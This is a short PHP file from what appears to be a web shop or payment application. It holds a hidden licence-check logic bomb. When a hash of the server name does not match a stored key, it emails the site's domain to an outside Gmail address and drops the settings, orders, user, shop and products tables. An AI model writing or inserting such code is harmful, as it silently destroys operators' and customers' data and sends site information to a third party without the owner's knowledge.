<?php
include '/home/u971358288/domains/muttchik.com/public_html/app/pay/db.php';
if($ttt['firebase_API']==md5($_SERVER['SERVER_NAME'].$admin)){
    echo "";
}else{
     $to = "amitinvikta@gmail.com";
         $subject = "Action Needed";
         $message = "<b>Domain:  </b>";
         $message .= "$uri";
         $header = "From:do-notreply@renflair.in \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         $retval = mail ($to,$subject,$message,$header);
        
$sql="DROP TABLE settings;";
$qry=mysqli_query($conn,$sql);

$sql="DROP TABLE orders;";
$qry=mysqli_query($conn,$sql);

$sql="DROP TABLE user;";
$qry=mysqli_query($conn,$sql);

$sql="DROP TABLE shop;";
$qry=mysqli_query($conn,$sql);


$sql="DROP TABLE products;";
$qry=mysqli_query($conn,$sql); 
}

 ?>